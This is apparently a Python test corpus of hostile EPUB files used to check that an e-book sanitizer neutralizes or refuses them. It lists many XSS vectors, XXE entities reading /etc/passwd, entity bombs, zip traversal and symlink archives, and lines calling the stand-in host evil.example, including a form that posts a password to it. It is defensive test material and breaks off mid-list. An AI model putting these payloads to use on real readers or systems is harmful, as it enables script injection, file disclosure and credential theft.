# SPDX-License-Identifier: MIT
# ruff: noqa: E501
"""The trapped-EPUB corpus: one case at least per attack vector (EF-BIB-051 (8), ENF-SEC-015).

Every case is an EPUB built by `build.py` around one hostile entry. A case ends in one of two
outcomes: `neutralized` (the EPUB is accepted and the derivative holds no active pattern) or
`refused` (the archive or one XML entry is unsafe, so nothing is produced). Mutations of the main
vectors (letter case, entity encoding, inserted whitespace) are generated, not written by hand.
"""

from __future__ import annotations

from collections.abc import Iterator
from dataclasses import dataclass
from functools import cache
from typing import Final, Literal

from shelfhold.sdk.testing.corpus.trapped_epubs.build import (
    CONTAINER,
    EPUB_NS,
    SVG_NS,
    TINY_PNG,
    XHTML_NS,
    XLINK_NS,
    Member,
    epub_bytes,
    opf,
    xhtml,
    zip_bytes,
)

Outcome = Literal["neutralized", "refused"]
CHAPTER: Final = "OEBPS/ch1.xhtml"
STYLESHEET: Final = "OEBPS/style.css"


@dataclass(frozen=True)
class Trap:
    name: str
    vector: str
    epub: bytes
    outcome: Outcome = "neutralized"
    entry: str = CHAPTER  # the hostile entry, which must come out clean
    reason: str = ""  # the stable word of a refusal


def _page(name: str, vector: str, body: str, head: str = "") -> Trap:
    return Trap(name, vector, epub_bytes(xhtml(body, head)))


def _raw_page(name: str, vector: str, document: bytes, outcome: Outcome = "neutralized",
              reason: str = "") -> Trap:  # fmt: skip
    return Trap(name, vector, epub_bytes(document), outcome, CHAPTER, reason)


def _svg(inner: str, attrs: str = "") -> str:
    return (
        f'<svg xmlns="{SVG_NS}" xmlns:xlink="{XLINK_NS}" viewBox="0 0 10 10"{attrs}>{inner}</svg>'
    )


_XML: Final = '<?xml version="1.0" encoding="utf-8"?>\n'


def _scripts() -> list[Trap]:
    ns = f'xmlns:x="{XHTML_NS}"'
    return [
        _page("script_plain", "script", "<p>a</p><script>alert(1)</script>"),
        _page("script_src", "script", '<script src="http://evil.example/x.js"></script>'),
        _page("script_in_head", "script", "<p>a</p>", "<script>alert(1)</script>"),
        _page("script_uppercase", "script", "<SCRIPT>alert(1)</SCRIPT>"),
        _page("script_mixed_case", "script", "<ScRiPt>alert(1)</ScRiPt>"),
        _page("script_cdata", "script", "<script><![CDATA[alert(1)]]></script>"),
        _page("script_prefixed_xhtml", "script", f"<x:script {ns}>alert(1)</x:script>"),
        _page("script_svg", "script", _svg("<script>alert(1)</script>")),
        _page("script_svg_prefixed", "script", f'<s:svg xmlns:s="{SVG_NS}"><s:script>alert(1)</s:script></s:svg>'),
        _page("script_svg_href", "script", _svg('<script xlink:href="http://evil.example/x.js"/>')),
        _page("script_in_noscript", "script", "<noscript><script>alert(1)</script></noscript>"),
        _page("script_in_template", "script", "<template><script>alert(1)</script></template>"),
        _page("script_in_style_text", "script", "<style>p{color:red}</style><p>x</p>", "<script>1</script>"),
        _raw_page("script_split_by_comment", "script", xhtml("<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>"), "refused", "malformed"),
        _page("script_in_comment_cdata_mix", "script", "<!-- x --><![CDATA[ > <script>alert(1)</script> ]]><p>a</p>"),
    ]  # fmt: skip


def _handlers() -> list[Trap]:
    return [
        _page("handler_onerror", "handler", '<img src="cover.png" onerror="alert(1)" alt=""/>'),
        _page("handler_onclick", "handler", '<p onclick="alert(1)">x</p>'),
        _page("handler_upper", "handler", '<p ONMOUSEOVER="alert(1)">x</p>'),
        _page("handler_mixed", "handler", '<p oNfOcUs="alert(1)" autofocus="autofocus" tabindex="0">x</p>'),
        _page("handler_svg_onload", "handler", _svg("<rect width='1' height='1'/>", ' onload="alert(1)"')),
        _page("handler_svg_child", "handler", _svg('<circle r="1" onmouseover="alert(1)"/>')),
        _page("handler_epub_ns", "handler", f'<p xmlns:e="{EPUB_NS}" e:onclick="alert(1)">x</p>'),
        _page("handler_onpointerenter", "handler", '<div onpointerenter="alert(1)">x</div>'),
        _page("handler_onanimationstart", "handler", '<p style="animation:a" onanimationstart="alert(1)">x</p>'),
    ]  # fmt: skip


def _script_urls() -> list[Trap]:
    def link(href: str, tag: str = "a", attr: str = "href") -> str:
        return f'<{tag} {attr}="{href}">x</{tag}>'

    return [
        _page("url_javascript", "javascript-url", link("javascript:alert(1)")),
        _page("url_javascript_upper", "javascript-url", link("JAVASCRIPT:alert(1)")),
        _page("url_javascript_entities", "javascript-url", link("&#106;&#97;&#118;&#97;script:alert(1)")),
        _page("url_javascript_hex_entities", "javascript-url", link("&#x6A;&#x61;vascript:alert(1)")),
        _page("url_javascript_padded_entity", "javascript-url", link("&#0000106;avascript:alert(1)")),
        _page("url_javascript_tab", "javascript-url", link("java&#9;script:alert(1)")),
        _page("url_javascript_newline", "javascript-url", link("java&#10;script:alert(1)")),
        _page("url_javascript_cr", "javascript-url", link("java&#13;script:alert(1)")),
        _page("url_javascript_leading_space", "javascript-url", link("   javascript:alert(1)")),
        _raw_page("url_javascript_leading_control", "javascript-url", xhtml(link("&#1;javascript:alert(1)")), "refused", "malformed"),
        _page("url_javascript_leading_invisible", "javascript-url", link("&#x200B;&#xA0;javascript:alert(1)")),
        _page("url_vbscript", "javascript-url", link("vbscript:msgbox(1)")),
        _page("url_data_html", "data-url", link("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")),
        _page("url_data_html_plain", "data-url", link("data:text/html,<script>alert(1)</script>".replace("<", "&lt;"))),
        _page("url_data_in_img_svg", "data-url", '<img src="data:image/svg+xml;base64,PHN2Zy8+" alt=""/>'),
        _page("url_data_in_object", "data-url", link("data:text/html,x", "object", "data")),
        _page("url_javascript_form_action", "javascript-url", '<form action="javascript:alert(1)"><button>go</button></form>'),
        _page("url_javascript_formaction", "javascript-url", '<form><button formaction="javascript:alert(1)">go</button></form>'),
        _page("url_javascript_svg_a", "javascript-url", _svg('<a xlink:href="javascript:alert(1)"><text>x</text></a>')),
        _page("url_javascript_svg_a_href", "javascript-url", _svg('<a href="javascript:alert(1)"><text>x</text></a>')),
        _page("url_javascript_img", "javascript-url", link("javascript:alert(1)", "img", "src")),
        _page("url_javascript_area", "javascript-url", '<map name="m"><area href="javascript:alert(1)" shape="default"/></map>'),
        _page("url_protocol_relative_a", "remote-resource", link("//evil.example/x")),
        _page("url_backslash_relative", "remote-resource", link("\\\\evil.example\\x", "img", "src")),
    ]  # fmt: skip


def _frames() -> list[Trap]:
    return [
        _page("iframe", "iframe", '<iframe src="http://evil.example/"></iframe>'),
        _page("iframe_srcdoc", "iframe", '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>'),
        _page("iframe_upper", "iframe", '<IFRAME src="x.xhtml"></IFRAME>'),
        _page("frameset", "iframe", '<frameset><frame src="http://evil.example/"/></frameset>'),
        _page("object", "object", '<object data="http://evil.example/x.swf" type="application/x-shockwave-flash"></object>'),
        _page("object_internal", "object", '<object data="x.svg" type="image/svg+xml"></object>'),
        _page("embed", "embed", '<embed src="http://evil.example/x.swf"/>'),
        _page("applet", "embed", '<applet code="X.class"></applet>'),
        _page("form", "form", '<form action="http://evil.example/steal" method="post"><input name="p" type="password"/></form>'),
        _page("form_no_action", "form", '<form><input type="text" name="q"/><button type="submit">go</button></form>'),
        _page("base", "base", "<p>a</p>", '<base href="http://evil.example/"/>'),
        _page("meta_refresh", "meta-refresh", "<p>a</p>", '<meta http-equiv="refresh" content="0;url=http://evil.example/"/>'),
        _page("meta_refresh_upper", "meta-refresh", "<p>a</p>", '<META HTTP-EQUIV="Refresh" CONTENT="0;url=javascript:alert(1)"/>'),
        _page("meta_csp", "meta-refresh", "<p>a</p>", '<meta http-equiv="Content-Security-Policy" content="default-src *"/>'),
        _page("link_remote_stylesheet", "link-remote", "<p>a</p>", '<link rel="stylesheet" href="http://evil.example/x.css"/>'),
        _page("link_protocol_relative", "link-remote", "<p>a</p>", '<link rel="stylesheet" href="//evil.example/x.css"/>'),
        _page("link_prefetch", "link-remote", "<p>a</p>", '<link rel="prefetch" href="http://evil.example/"/>'),
        _page("link_import", "link-remote", "<p>a</p>", '<link rel="import" href="x.html"/>'),
        _page("video_poster", "remote-resource", '<video src="http://evil.example/v.mp4" poster="http://evil.example/p.png"></video>'),
        _page("audio", "remote-resource", '<audio src="http://evil.example/a.mp3"></audio>'),
    ]  # fmt: skip


def _remote() -> list[Trap]:
    return [
        _page("img_remote", "remote-resource", '<img src="http://evil.example/p.png" alt=""/>'),
        _page("img_remote_https", "remote-resource", '<img src="https://evil.example/p.png" alt=""/>'),
        _page("img_protocol_relative", "remote-resource", '<img src="//evil.example/p.png" alt=""/>'),
        _page("img_srcset", "remote-resource", '<img src="cover.png" srcset="http://evil.example/p.png 2x" alt=""/>'),
        _page("img_ftp", "remote-resource", '<img src="ftp://evil.example/p.png" alt=""/>'),
        _page("svg_image_remote", "remote-resource", _svg('<image xlink:href="http://evil.example/p.png" width="1" height="1"/>')),
        _page("svg_image_href_remote", "remote-resource", _svg('<image href="https://evil.example/p.png" width="1" height="1"/>')),
        _page("body_background", "remote-resource", '<table background="http://evil.example/p.png"><tr><td>x</td></tr></table>'),
        _page("blockquote_cite", "remote-resource", '<blockquote cite="http://evil.example/">x</blockquote>'),
    ]  # fmt: skip


def _svg_cases() -> list[Trap]:
    return [
        _page("svg_foreignobject", "svg", _svg(f"<foreignObject><p xmlns='{XHTML_NS}'>x<script>alert(1)</script></p></foreignObject>")),
        _page("svg_foreignobject_iframe", "svg", _svg(f"<foreignObject><iframe xmlns='{XHTML_NS}' src='http://evil.example/'/></foreignObject>")),
        _page("svg_foreignobject_lower", "svg", _svg(f"<foreignobject><body xmlns='{XHTML_NS}' onload='alert(1)'/></foreignobject>")),
        _page("svg_use_remote_xlink", "svg", _svg('<use xlink:href="http://evil.example/x.svg#a"/>')),
        _page("svg_use_remote_href", "svg", _svg('<use href="//evil.example/x.svg#a"/>')),
        _page("svg_use_data", "svg", _svg('<use href="data:image/svg+xml;base64,PHN2Zy8+#a"/>')),
        _page("svg_animate_href", "svg", _svg('<a xlink:href="#"><animate attributeName="href" values="javascript:alert(1)"/><text>x</text></a>')),
        _page("svg_animate_xlink_href", "svg", _svg('<a><animate attributeName="xlink:href" to="javascript:alert(1)"/></a>')),
        _page("svg_set_href", "svg", _svg('<a><set attributeName="href" to="javascript:alert(1)"/><text>x</text></a>')),
        _page("svg_animate_transform", "svg", _svg('<rect width="1" height="1"><animateTransform attributeName="transform" type="rotate" from="0" to="1" onend="alert(1)"/></rect>')),
        _page("svg_handler_on_animation", "svg", _svg('<rect width="1" height="1"><animate attributeName="x" onbegin="alert(1)"/></rect>')),
        _page("svg_style_import", "svg", _svg("<style>@import url(http://evil.example/x.css);</style>")),
        _page("svg_style_url", "svg", _svg("<style>rect{fill:url(http://evil.example/x.svg#a)}</style>")),
        _page("svg_fill_url_remote", "svg", _svg('<rect width="1" height="1" fill="url(http://evil.example/x.svg#a)"/>')),
        _page("svg_filter_url_remote", "svg", _svg('<rect width="1" height="1" filter="url(//evil.example/x.svg#f)"/>')),
        _page("svg_feimage", "svg", _svg('<filter id="f"><feImage xlink:href="http://evil.example/p.png"/></filter>')),
        _page("svg_handler_upper", "svg", _svg('<g ONCLICK="alert(1)"><path d="M0 0"/></g>')),
        _page("svg_mpath_remote", "svg", _svg('<path id="p" d="M0 0"/><animateMotion><mpath xlink:href="http://evil.example/p.svg#p"/></animateMotion>')),
        _page("svg_set_style", "svg", _svg('<rect width="1" height="1"><set attributeName="style" to="background:url(http://evil.example/)"/></rect>')),
    ]  # fmt: skip


def _css() -> list[Trap]:
    def style(css: str) -> Trap:
        return _page(f"style_{len(css)}", "css", "<p>x</p>", f"<style>{css}</style>")

    sheets = {
        "style_url_remote": "p{background:url(http://evil.example/p.png)}",
        "style_url_https_quoted": "p{background:url('https://evil.example/p.png')}",
        "style_url_protocol_relative": "p{background:url(//evil.example/p.png)}",
        "style_import": '@import "http://evil.example/x.css";',
        "style_import_url": "@import url(http://evil.example/x.css);",
        "style_import_relative": '@import "other.css";',
        "style_import_upper": "@IMPORT URL(HTTP://EVIL.EXAMPLE/X.CSS);",
        "style_escape_url": "p{background:u\\72l(http://evil.example/p.png)}",
        "style_escape_hex": "p{background:\\75rl(http://evil.example/p.png)}",
        "style_comment_url": "p{background:url/**/(http://evil.example/p.png)}",
        "style_expression": "p{width:expression(alert(1))}",
        "style_behavior": "p{behavior:url(x.htc)}",
        "style_moz_binding": "p{-moz-binding:url(http://evil.example/x.xml#a)}",
        "style_font_face_remote": "@font-face{font-family:x;src:url(http://evil.example/x.woff)}",
        "style_image_set": 'p{background:image-set("http://evil.example/p.png" 1x)}',
        "style_javascript": "p{background:url(javascript:alert(1))}",
        "style_data_url": "p{background:url(data:text/html,x)}",
        "style_close_tag": "p{color:red}</style><script>alert(1)</script><style>",
    }
    out = [_page(name, "css", "<p>x</p>", f"<style>{css.replace('<', '&lt;')}</style>")
           for name, css in sheets.items()]  # fmt: skip
    out += [
        _page("style_attr_url", "css", '<p style="background:url(http://evil.example/p.png)">x</p>'),
        _page("style_attr_import_like", "css", '<p style="background:url(&#x68;ttp://evil.example/p.png)">x</p>'),
        _page("style_attr_expression", "css", '<p style="width:expression(alert(1))">x</p>'),
        _page("style_attr_escape", "css", '<p style="background:\\75rl(//evil.example/)">x</p>'),
        _page("style_attr_svg", "css", _svg('<rect width="1" height="1" style="fill:url(http://evil.example/a.svg#a)"/>')),
    ]  # fmt: skip
    sheet_files = {
        "css_file_import": b'@import url("http://evil.example/x.css");\np{color:red}\n',
        "css_file_url": b"p{background:url(http://evil.example/p.png)}\n",
        "css_file_font": b"@font-face{font-family:x;src:url(//evil.example/x.woff)}\n",
        "css_file_escape": b"p{background:u\\72l(http://evil.example/p.png)}\n",
        "css_file_expression": b"p{width:expression(alert(1))}\n",
        "css_file_import_relative": b'@import "other.css";\n',
    }
    out += [Trap(n, "css", epub_bytes(xhtml("<p>x</p>"), css=c), entry=STYLESHEET)
            for n, c in sheet_files.items()]  # fmt: skip
    return out


def _entities_and_xml() -> list[Trap]:
    def doc(doctype: str, body: str = "<p>&xxe;</p>") -> bytes:
        return (f'{_XML}{doctype}\n<html xmlns="{XHTML_NS}"><head><title>T</title></head>'
                f"<body>{body}</body></html>").encode()  # fmt: skip

    laughs = "".join(
        f'<!ENTITY l{i} "{f"&l{i - 1};" * 10}">' if i else '<!ENTITY l0 "lol">' for i in range(9)
    )
    return [
        _raw_page("xxe_file", "xxe", doc('<!DOCTYPE html [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'), "refused", "dtd"),
        _raw_page("xxe_http", "xxe", doc('<!DOCTYPE html [<!ENTITY xxe SYSTEM "http://evil.example/x">]>'), "refused", "dtd"),
        _raw_page("xxe_parameter_entity", "xxe", doc('<!DOCTYPE html [<!ENTITY % p SYSTEM "http://evil.example/x.dtd">%p;]>', "<p>x</p>"), "refused", "dtd"),
        _raw_page("xxe_external_dtd", "xxe", doc('<!DOCTYPE html SYSTEM "http://evil.example/x.dtd">', "<p>x</p>"), "neutralized"),
        _raw_page("billion_laughs", "entity-bomb", doc(f"<!DOCTYPE html [{laughs}]>", "<p>&l8;</p>"), "refused", "dtd"),
        _raw_page("internal_entity", "entity-bomb", doc('<!DOCTYPE html [<!ENTITY a "b">]>', "<p>&a;</p>"), "refused", "dtd"),
        _raw_page("undefined_entity", "entity-bomb", doc("", "<p>&nope;</p>"), "refused", "malformed"),
        _raw_page("malformed_xml", "xxe", b"<html><p>unclosed", "refused", "malformed"),
        _raw_page("doctype_public_plain", "xxe", doc('<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">', "<p>a&nbsp;b<script>alert(1)</script></p>")),
        Trap("xxe_in_svg_file", "xxe", epub_bytes(xhtml("<p>x</p>"), extra=[Member(
            "OEBPS/pic.svg", f'{_XML}<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="{SVG_NS}"><text>&xxe;</text></svg>'.encode())],
            opf_extra='<item id="pic" href="pic.svg" media-type="image/svg+xml"/>'), outcome="refused", reason="dtd", entry="OEBPS/pic.svg"),
        Trap("deeply_nested", "entity-bomb", epub_bytes(xhtml("<div>" * 200 + "x" + "</div>" * 200)), "refused", "too_deep"),
    ]  # fmt: skip


def _standalone_files() -> list[Trap]:
    svg_script = (
        f'{_XML}<svg xmlns="{SVG_NS}" onload="alert(1)"><script>alert(1)</script></svg>'.encode()
    )
    svg_use = f'{_XML}<svg xmlns="{SVG_NS}" xmlns:xlink="{XLINK_NS}"><use xlink:href="http://evil.example/x.svg#a"/></svg>'.encode()
    html_page = f'{_XML}<html xmlns="{XHTML_NS}"><head><title>T</title></head><body><p onclick="alert(1)">x</p><script>1</script></body></html>'.encode()
    return [
        Trap("svg_file_script", "svg", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/pic.svg", svg_script)], opf_extra='<item id="pic" href="pic.svg" media-type="image/svg+xml"/>'), entry="OEBPS/pic.svg"),
        Trap("svg_file_use_remote", "svg", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/pic.svg", svg_use)], opf_extra='<item id="pic" href="pic.svg" media-type="image/svg+xml"/>'), entry="OEBPS/pic.svg"),
        Trap("svg_file_undeclared", "svg", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/hidden.svg", svg_script)]), entry="OEBPS/hidden.svg"),
        Trap("html_extension_page", "script", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/extra.html", html_page)]), entry="OEBPS/extra.html"),
        Trap("htm_extension_page", "script", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/extra.htm", html_page)]), entry="OEBPS/extra.htm"),
        Trap("xhtml_manifest_odd_extension", "script", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/extra.dat", html_page)], opf_extra='<item id="x" href="extra.dat" media-type="application/xhtml+xml"/>'), entry="OEBPS/extra.dat"),
        Trap("svg_in_jpg", "disguise", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/p.jpg", svg_script)]), outcome="refused", reason="magic_mismatch", entry="OEBPS/p.jpg"),
        Trap("html_in_png", "disguise", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/p.png", b"<!DOCTYPE html><script>alert(1)</script>")]), outcome="refused", reason="magic_mismatch", entry="OEBPS/p.png"),
        Trap("html_in_xml", "disguise", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/data.xml", html_page)]), "refused", "OEBPS/data.xml", "page_in_xml"),
    ]  # fmt: skip


def _archives() -> list[Trap]:
    page = epub_bytes
    ok = xhtml("<p>x</p>")
    bomb = Member("OEBPS/big.bin", b"\0" * (64 * 1024 * 1024))
    return [
        Trap("zip_traversal", "archive", page(ok, extra=[Member("../evil.xhtml", b"x")]), "refused", "unsafe_path"),
        Trap("zip_traversal_nested", "archive", page(ok, extra=[Member("OEBPS/../../evil", b"x")]), "refused", "unsafe_path"),
        Trap("zip_absolute", "archive", page(ok, extra=[Member("/etc/cron.d/x", b"x")]), "refused", "unsafe_path"),
        Trap("zip_drive_path", "archive", page(ok, extra=[Member("C:/x", b"x")]), "refused", "unsafe_path"),
        Trap("zip_backslash", "archive", page(ok, extra=[Member("OEBPS\\..\\x", b"x")]), "refused", "unsafe_path"),
        Trap("zip_symlink", "archive", page(ok, extra=[Member("OEBPS/link.xhtml", b"/etc/passwd", attr=0o120777 << 16)]), "refused", "symlink"),
        Trap("zip_bomb", "archive", page(ok, extra=[bomb]), "refused", "ratio"),
        Trap("zip_duplicate_name", "archive", page(ok, extra=[Member("OEBPS/ch1.xhtml", b"<p>x</p>")]), "refused", "duplicate_name"),
        Trap("zip_duplicate_case", "archive", page(ok, extra=[Member("OEBPS/CH1.xhtml", b"<p>x</p>")]), "refused", "duplicate_name"),
        Trap("zip_duplicate_unicode", "archive", zip_bytes([Member("mimetype", b"application/epub+zip", False), Member("a/\u00e9.xhtml", b"x"), Member("a/e\u0301.xhtml", b"x")]), "refused", "duplicate_name"),
        Trap("zip_not_an_archive", "archive", b"<html><script>alert(1)</script></html>", "refused", "unsupported_format"),
        Trap("zip_mimetype_missing", "archive", page(ok, first=[]), "refused", "mimetype"),
        Trap("zip_mimetype_not_first", "archive", page(ok, first=[Member("OEBPS/z.txt", b"z"), Member("mimetype", b"application/epub+zip", False)]), "refused", "mimetype"),
        Trap("zip_mimetype_wrong", "archive", page(ok, first=[Member("mimetype", b"text/html", False)]), "refused", "mimetype"),
        Trap("meta_inf_manifest_page", "disguise", page(ok, opf_extra='<item id="e" href="../META-INF/evil.xhtml" media-type="application/xhtml+xml"/>', extra=[Member("META-INF/evil.xhtml", b"<html><script>alert(1)</script></html>")]), "refused", "meta_inf_item"),
        Trap("meta_inf_undeclared_page", "disguise", page(ok, extra=[Member("META-INF/evil.xhtml", xhtml("<p>x</p><script>alert(1)</script>"))]), "neutralized", "META-INF/evil.xhtml"),
        Trap("meta_inf_unknown_file", "disguise", page(ok, extra=[Member("META-INF/evil.dat", b"x")]), "refused", "unexpected_entry"),
        Trap("meta_inf_encryption", "disguise", page(ok, extra=[Member("META-INF/encryption.xml", b"<encryption/>")]), "refused", "encrypted"),
        Trap("zip_opf_missing", "archive", zip_bytes([Member("mimetype", b"application/epub+zip", False), Member("OEBPS/ch1.xhtml", ok)]), "refused", "container"),
    ]  # fmt: skip


def _review_cases() -> list[Trap]:
    """Cases the first review of the neutralizer found (entries of any name, the OPF, XSL, links)."""
    page = xhtml("<p>hi</p><script>alert(document.cookie)</script>")
    svg = f'{_XML}<svg xmlns="{SVG_NS}" onload="alert(1)"><script>alert(1)</script></svg>'.encode()

    def declared(name: str, media: str, data: bytes = page, reason: str = "") -> Trap:
        item = f'<item id="x" href="{name.rsplit("/", 1)[-1]}" media-type="{media}"/>'
        return Trap(
            f"declared_{media.replace('/', '_')}_{name.rsplit('/', 1)[-1] or 'x'}", "disguise",
            epub_bytes(xhtml("<p>x</p>"), extra=[Member(name, data)], opf_extra=item),
            "refused" if reason else "neutralized", name, reason,
        )  # fmt: skip

    def stray(name: str, data: bytes = page, reason: str = "unexpected_entry") -> Trap:
        return Trap(
            f"undeclared_{name.rsplit('/', 1)[-1]}", "disguise",
            epub_bytes(xhtml("<p>x</p>"), extra=[Member(name, data)]), "refused", name, reason,
        )  # fmt: skip

    def remote(label: str, items: str = "", guide: str = "") -> Trap:
        return Trap(
            f"opf_remote_{label}", "opf-remote",
            epub_bytes(xhtml("<p>x</p>"), opf_extra=items, guide=guide),
            "refused", "OEBPS/content.opf", "remote_reference",
        )  # fmt: skip

    def pi(label: str, document: bytes, entry: str = CHAPTER, extra: list[Member] | None = None,
           opf_extra: str = "") -> Trap:  # fmt: skip
        return Trap(f"xsl_pi_{label}", "xsl-pi",
                    epub_bytes(document, extra=extra or [], opf_extra=opf_extra),
                    "refused", entry, "xml_stylesheet")  # fmt: skip

    xsl = b'<?xml-stylesheet type="text/xsl" href="http://evil.example/x.xsl"?>\n'
    _, _, tail = xhtml("<p>x</p>").partition(b"\n")
    utf16 = ("<?xml version='1.0' encoding='utf-16'?>\n" + xsl.decode() + tail.decode()).encode(
        "utf-16"
    )
    link = '<p>Read <a href="{}">the source</a> and <a href="ch2.xhtml#n">a note</a>.</p>'
    return [
        declared("OEBPS/page.dat", "text/html"),
        declared("OEBPS/page", "text/html"),
        declared("OEBPS/page", "text/xml", reason="page_in_xml"),
        declared("OEBPS/data.bin", "application/xml", reason="unexpected_entry"),
        declared("OEBPS/pic", "text/xml", svg, "page_in_xml"),
        stray("OEBPS/page"),
        stray("OEBPS/page.bin"),
        stray("OEBPS/notes.js", b"<html><body><script>alert(1)</script></body></html>"),
        stray("OEBPS/pic.svgz", b"\x1f\x8b\x08\x00compressed-svg"),
        stray("OEBPS/style.xsl", b"<xsl:stylesheet xmlns:xsl='http://www.w3.org/1999/XSL/Transform'/>"),
        stray("OEBPS/late.bin", "   \n\ufeff<!DOCTYPE html><script>1</script>".encode()),
        remote("cover_https", '<item id="c" href="https://evil.example/c.png" media-type="image/png" properties="cover-image"/>'),
        remote("cover_protocol_relative", '<item id="c" href="//evil.example/c.png" media-type="image/png"/>'),
        remote("item_javascript", '<item id="c" href="java&#9;script:alert(1)" media-type="image/png"/>'),
        remote("item_rooted", '<item id="c" href="/api/x" media-type="image/png"/>'),
        remote("guide", guide='<guide><reference type="cover" title="c" href="http://evil.example/c.xhtml"/></guide>'),
        pi("xhtml", xhtml("<p>x</p>").replace(b"\n", b"\n" + xsl, 1)),
        pi("xhtml_utf16", utf16),
        Trap("xsl_pi_svg_file", "xsl-pi", epub_bytes(xhtml("<p>x</p>"), extra=[Member("OEBPS/pic.svg", f'{_XML}'.encode() + xsl + f'<svg xmlns="{SVG_NS}"/>'.encode())]), "refused", "OEBPS/pic.svg", "xml_stylesheet"),
        _page("link_http", "outbound-link", link.format("http://evil.example/x")),
        _page("link_https", "outbound-link", link.format("https://evil.example/x")),
        _page("link_mailto", "outbound-link", link.format("mailto:a@b.example")),
        _page("link_protocol_relative_text", "outbound-link", link.format("//evil.example/x")),
        _page("link_http_upper_entities", "outbound-link", link.format("&#72;TTP://evil.example/x")),
    ]  # fmt: skip


def _whitelist_cases() -> list[Trap]:
    """The bypasses of the first sniffing (second review): padding, prefixes, charset, OPF, XSL."""
    evil = f'<html xmlns="{XHTML_NS}"><body><script>alert(1)</script></body></html>'
    pad_spaces = (_XML + " " * 10240 + evil).encode()
    pad_comment = (_XML + "<!--" + "x" * 10240 + "-->" + evil).encode()
    u16 = (_XML.replace("utf-8", "utf-16") + evil).encode("utf-16")
    u32 = (_XML.replace("utf-8", "utf-32") + evil).encode("utf-32")
    prefixed = f'{_XML}<h:html xmlns:h="{XHTML_NS}"><h:body><h:script>alert(1)</h:script></h:body></h:html>'.encode()
    data_h = f'{_XML}<data xmlns:h="{XHTML_NS}"><h:script>alert(1)</h:script></data>'.encode()
    svg_p = f'{_XML}<s:svg xmlns:s="{SVG_NS}"><s:script>alert(1)</s:script></s:svg>'.encode()
    xsl = (
        f'{_XML}<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><!--{"x" * 10240}-->'
        f'<xsl:template match="/"><h:html xmlns:h="{XHTML_NS}"><h:script>alert(1)</h:script></h:html></xsl:template></xsl:stylesheet>'
    ).encode()
    pi = '<?xml-stylesheet type="text/xsl" href="e.xsl"?>'

    def entry(label: str, name: str, data: bytes, reason: str, media: str = "") -> Trap:
        items = (
            f'<item id="e" href="{name.rsplit("/", 1)[-1]}" media-type="{media}"/>' if media else ""
        )
        return Trap(f"wl_{label}", "disguise", epub_bytes(xhtml("<p>x</p>"), extra=[Member(name, data)], opf_extra=items),
                    "refused" if reason else "neutralized", name, reason)  # fmt: skip

    def package(label: str, mutate: str, reason: str = "remote_reference") -> Trap:
        document = (
            opf()
            .decode()
            .replace("<dc:language>en</dc:language>", "<dc:language>en</dc:language>" + mutate)
        )
        return Trap(f"wl_opf_{label}", "opf-remote", epub_bytes(xhtml("<p>x</p>"), opf_bytes=document.encode()),
                    "refused", "OEBPS/content.opf", reason)  # fmt: skip

    def hostile_item(label: str, href: str) -> Trap:
        return Trap(f"wl_item_{label}", "opf-remote",
                    epub_bytes(xhtml("<p>x</p>"), opf_extra=f'<item id="r" href="{href}" media-type="image/png"/>'),
                    "refused", "OEBPS/content.opf", "remote_reference")  # fmt: skip

    cases = [
        entry("pad_spaces_dat", "OEBPS/e.dat", pad_spaces, "unexpected_entry"),
        entry("pad_comment_dat", "OEBPS/e.dat", pad_comment, "unexpected_entry"),
        entry("pad_comment_xml", "OEBPS/e.xml", pad_comment, "page_in_xml"),
        entry("pad_comment_ncx", "OEBPS/toc.ncx", pad_comment, "page_in_xml"),
        entry(
            "pad_comment_text_xml_bin", "OEBPS/e.bin", pad_comment, "unexpected_entry", "text/xml"
        ),
        entry("pad_comment_png", "OEBPS/e.png", pad_comment, "magic_mismatch"),
        entry(
            "pad_comment_charset",
            "OEBPS/e.dat",
            pad_comment,
            "",
            "application/xhtml+xml; charset=utf-8",
        ),
        entry(
            "charset_upper",
            "OEBPS/e.dat",
            (_XML + evil).encode(),
            "",
            "Application/XHTML+XML ; Charset=UTF-8",
        ),
        entry("utf16_dat", "OEBPS/e.dat", u16, "unexpected_entry"),
        entry("utf32_dat", "OEBPS/e.dat", u32, "unexpected_entry"),
        entry("gzip_dat", "OEBPS/e.dat", b"\x1f\x8b\x08\x00" + b"x" * 64, "unexpected_entry"),
        entry(
            "upper_svg_dat",
            "OEBPS/e.dat",
            f'{_XML}<SVG xmlns="{SVG_NS}"><script>1</script></SVG>'.encode(),
            "unexpected_entry",
        ),
        entry("prefixed_html_xml", "OEBPS/e.xml", prefixed, "page_in_xml"),
        entry("prefixed_html_dat", "OEBPS/e.dat", prefixed, "unexpected_entry"),
        entry("prefixed_script_xml", "OEBPS/e.xml", data_h, "page_in_xml"),
        entry("prefixed_script_ncx", "OEBPS/toc.ncx", data_h, "page_in_xml"),
        entry("prefixed_svg_xml", "OEBPS/e.xml", svg_p, "page_in_xml"),
        entry(
            "pi_in_xml", "OEBPS/d.xml", (_XML + pi + "<data/>").encode(), "processing_instruction"
        ),
        entry(
            "pi_in_ncx",
            "OEBPS/toc.ncx",
            (_XML + pi + '<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/"/>').encode(),
            "processing_instruction",
        ),
        entry(
            "pi_in_xml_utf16",
            "OEBPS/d.xml",
            (_XML.replace("utf-8", "utf-16") + pi + "<data/>").encode("utf-16"),
            "processing_instruction",
        ),
        entry(
            "pi_after_doctype_page",
            "OEBPS/p.xhtml",
            (
                _XML
                + "<!DOCTYPE html>\n"
                + pi
